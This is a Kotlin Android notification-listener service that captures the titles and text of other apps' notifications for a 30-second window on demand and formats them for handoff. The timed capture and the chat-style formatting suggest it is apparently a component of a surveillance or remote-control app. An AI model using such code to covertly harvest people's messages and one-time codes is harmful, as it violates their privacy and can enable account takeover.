package com.sanz.epep.service

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import com.sanz.epep.data.local.PrefsManager
import kotlinx.coroutines.*

class NotificationService : NotificationListenerService() {

    private val TAG = "NotifService"

    private val ignoredPackages = setOf(
        "android", "com.android.systemui", "com.android.phone",
        "com.google.android.gms", "com.android.vending", "com.sanz.epep"
    )

    companion object {
        var isMonitoring = false
        var monitorEndTime = 0L
        private val collectedNotifs = mutableListOf<String>()
        private val lock = Any()

        fun startMonitoring() {
            synchronized(lock) {
                collectedNotifs.clear()
                isMonitoring = true
                monitorEndTime = System.currentTimeMillis() + 30_000L
            }
        }

        fun getAndClearNotifs(): List<String> {
            synchronized(lock) {
                val copy = collectedNotifs.toList()
                collectedNotifs.clear()
                isMonitoring = false
                return copy
            }
        }

        fun addNotif(msg: String) {
            synchronized(lock) {
                if (collectedNotifs.size < 30) collectedNotifs.add(msg)
            }
        }
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val pkg = sbn.packageName ?: return
            if (pkg in ignoredPackages) return

            PrefsManager.init(applicationContext)
            if (!PrefsManager.isSetupDone) return

            val extras = sbn.notification?.extras ?: return
            val title = extras.getString("android.title") ?: ""
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            if (title.isEmpty() && text.isEmpty()) return

            val appName = try {
                packageManager.getApplicationLabel(
                    packageManager.getApplicationInfo(pkg, 0)
                ).toString()
            } catch (_: Exception) { pkg }

            val msg = "🔔 $appName\n" +
                    (if (title.isNotEmpty()) "👤 $title\n" else "") +
                    (if (text.isNotEmpty()) "💬 $text" else "")

            if (isMonitoring && System.currentTimeMillis() < monitorEndTime) {
                addNotif(msg)
            }
        } catch (e: Exception) {
            Log.e(TAG, "err: ${e.message}")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {}
}
